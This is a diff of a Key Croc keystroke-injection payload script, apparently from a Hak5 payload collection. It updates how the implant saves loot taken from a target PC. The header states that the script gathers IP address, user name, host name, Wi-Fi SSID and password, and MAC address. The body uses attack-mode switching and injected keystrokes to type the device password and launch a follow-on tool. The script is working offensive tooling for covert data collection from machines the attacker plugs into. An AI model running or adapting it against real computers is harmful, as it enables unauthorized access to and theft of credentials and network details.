@@ -3,7 +3,7 @@
 #                This will collect some data off target PC (ip address, current user name, pc host name, ssid and passwd, mac address)
 #                save to tools/Croc_pot folder
 # Author:        Spywill
-# Version:       1.3.6
+# Version:       1.3.7
 # Category:      Key Croc
 
 MATCH crocpot
@@ -32,7 +32,6 @@ fi
 
 #---> Payload variable/remove existing OS detection
 CROC_OS=/root/udisk/tools/Croc_Pot/Croc_OS.txt
-cat > ${CROC_OS}
 rm /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt /root/udisk/tools/Croc_Pot/shark_ip.txt
 
 #---> Enter ethernet mode for OS detection
@@ -40,10 +39,10 @@ ATTACKMODE AUTO_ETHERNET
 LED ATTACK
 
 #---> Keycroc built in functions to retrieve target PC Loot
-GET TARGET_OS
-GET TARGET_IP
-GET HOST_IP
-GET TARGET_HOSTNAME
+#---> Save Keycroc built in functions to tools/Croc_Pot/Croc_OS.txt
+GET TARGET_OS && echo "$TARGET_OS" | tee ${CROC_OS}
+GET TARGET_IP && echo "$TARGET_IP" | tee -a ${CROC_OS}
+GET TARGET_HOSTNAME && echo "$TARGET_HOSTNAME" | tee -a ${CROC_OS}
 
 #---> After OS detection case TARGET_OS value
 case $TARGET_OS in
@@ -127,15 +126,13 @@ WINDOWS)
 	Q STRING "${CROC_PW}"
 	Q ENTER
 	sleep 2
-	#---> Save Keycroc built in functions to tools/Croc_Pot/Croc_OS.txt
-	echo "$TARGET_OS" >> ${CROC_OS}
-	echo "$TARGET_IP" >> ${CROC_OS}
-	echo "$TARGET_HOSTNAME" >> ${CROC_OS}
-	echo "$HOST_IP" >> ${CROC_OS}
-	#---> Edit with sed to remove powershell output "r" endlines & sed return only readable character & replace "-" with ":"
+	#---> sed to remove powershell output "\r" endlines
 	$(sed -i 's/\r//g' /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt /root/udisk/tools/Croc_Pot/shark_ip.txt /root/udisk/tools/Croc_Pot/squirrel_mac.txt /root/udisk/tools/Croc_Pot/turtle_mac.txt /root/udisk/tools/Croc_Pot/bunny_mac.txt)
+	#---> sed to return only readable character
 	$(sed -i $'s/[^[:print:]\t]//g' /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt /root/udisk/tools/Croc_Pot/shark_ip.txt /root/udisk/tools/Croc_Pot/squirrel_mac.txt /root/udisk/tools/Croc_Pot/turtle_mac.txt /root/udisk/tools/Croc_Pot/bunny_mac.txt)
+	#---> sed to remove powershell output first "?" character
 	$(sed -i '0,/./s/^.//' /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt /root/udisk/tools/Croc_Pot/shark_ip.txt /root/udisk/tools/Croc_Pot/squirrel_mac.txt /root/udisk/tools/Croc_Pot/bunny_mac.txt /root/udisk/tools/Croc_Pot/turtle_mac.txt)
+	#---> sed to replace "-" with ":"
 	$(sed -i 's/-/:/g' /root/udisk/tools/Croc_Pot/shark_ip.txt /root/udisk/tools/Croc_Pot/squirrel_mac.txt /root/udisk/tools/Croc_Pot/turtle_mac.txt /root/udisk/tools/Croc_Pot/bunny_mac.txt)
 	#---> Starting Croc_Pot
 	Q STRING "/root/udisk/tools/Croc_Pot.sh"
@@ -159,11 +156,6 @@ MACOS)
 	Q STRING "${CROC_PW}"
 	Q ENTER
 	sleep 1
-	#---> Save Keycroc built in functions to tools/Croc_Pot/Croc_OS.txt
-	echo "$TARGET_OS" >> ${CROC_OS}
-	echo "$TARGET_IP" >> ${CROC_OS}
-	echo "$TARGET_HOSTNAME" >> ${CROC_OS}
-	echo "$HOST_IP" >> ${CROC_OS}
 	#---> Starting Croc_Pot
 	Q STRING "/root/udisk/tools/Croc_Pot.sh"
 	Q ENTER ;;
@@ -242,11 +234,7 @@ raspberrypi)
 	#---> Entering keycroc passwd
 	Q STRING "${CROC_PW}"
 	Q ENTER
-	#---> Save Keycroc built in functions to tools/Croc_Pot/Croc_OS.txt
-	echo "$TARGET_OS" | tee -a ${CROC_OS}
-	echo "$TARGET_IP" | tee -a ${CROC_OS}
-	echo "$TARGET_HOSTNAME" | tee -a ${CROC_OS}
-	echo "$HOST_IP" | tee -a ${CROC_OS}
+	sleep 1
 	#---> Starting Croc_Pot
 	Q STRING "/root/udisk/tools/Croc_Pot.sh"
 	Q ENTER ;;
@@ -326,11 +314,7 @@ parrot)
 	#---> Entering keycroc passwd
 	Q STRING "${CROC_PW}"
 	Q ENTER
-	#---> Save Keycroc built in functions to tools/Croc_Pot/Croc_OS.txt
-	echo "$TARGET_OS" | tee -a ${CROC_OS}
-	echo "$TARGET_IP" | tee -a ${CROC_OS}
-	echo "$TARGET_HOSTNAME" | tee -a ${CROC_OS}
-	echo "$HOST_IP" | tee -a ${CROC_OS}
+	sleep 1
 	#---> Starting Croc_Pot
 	Q STRING "/root/udisk/tools/Croc_Pot.sh"
 	Q ENTER ;;
@@ -411,11 +395,7 @@ parrot)
 	#---> Entering keycroc passwd
 	Q STRING "${CROC_PW}"
 	Q ENTER
-	#---> Save Keycroc built in functions to tools/Croc_Pot/Croc_OS.txt
-	echo "$TARGET_OS" | tee -a ${CROC_OS}
-	echo "$TARGET_IP" | tee -a ${CROC_OS}
-	echo "$TARGET_HOSTNAME" | tee -a ${CROC_OS}
-	echo "$HOST_IP" | tee -a ${CROC_OS}
+	sleep 1
 	#---> Starting Croc_Pot
 	Q STRING "/root/udisk/tools/Croc_Pot.sh"
 	Q ENTER ;;
